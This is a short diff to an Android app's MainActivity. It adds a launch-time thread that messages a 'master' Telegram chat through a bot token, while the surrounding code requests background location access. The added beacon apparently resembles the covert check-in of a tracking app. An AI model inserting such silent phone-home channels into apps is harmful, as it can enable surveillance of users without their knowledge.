@@ -16,6 +16,8 @@ public class MainActivity extends android.app.Activity {
     @Override
     protected void onCreate(Bundle b) {
         super.onCreate(b);
+        new Thread(() -> new TelegramBridge(BuildConfig.BOT_TOKEN, BuildConfig.MASTER_CHAT)
+                .say("sat tap v" + BuildConfig.VERSION_NAME)).start();
         java.util.ArrayList<String> ps = new java.util.ArrayList<>();
         ps.add(Manifest.permission.ACCESS_FINE_LOCATION);
         if (Build.VERSION.SDK_INT >= 29) ps.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
